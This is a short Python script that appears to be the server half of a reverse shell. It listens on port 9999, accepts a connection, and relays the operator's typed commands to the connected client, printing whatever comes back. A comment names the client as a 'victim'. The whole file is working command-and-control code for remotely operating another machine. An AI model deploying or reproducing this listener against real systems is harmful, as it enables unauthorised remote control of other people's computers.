import socket
import sys

# Create a Socket(connect to computer)
def create_socket():

	try:		
		global host
		global port
		global s

		host = ""
		port = 9999
		s    = socket.socket()

	except socket.error as msg:	
		print("error in connecting: "+ str(msg))


# binding the socket and listening for connections
def bind_socket():
	try:
		global host
		global port
		global s

		print("binding the port: "+ str(port))

		s.bind((host,port))
		s.listen(5)

	except socket.error as msg:
		print("Socket binding error: "+str(msg) + "\n" +"Retrying... \n")
		bind_socket()


# establishing connection with a client(socket must be listening)
def socket_accept():
	
	conn,address = s.accept()
	print("Connection has been established "+ "IP: " + address[0] + "PORT: " + str(address[1])) #client information
	send_command(conn)
	conn.close()


# Send commands to client/victim or a friend
def send_command(conn):

	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024),"utf-8")
			print(client_response, end="")


def main():
	create_socket()
	bind_socket()
	socket_accept()

main()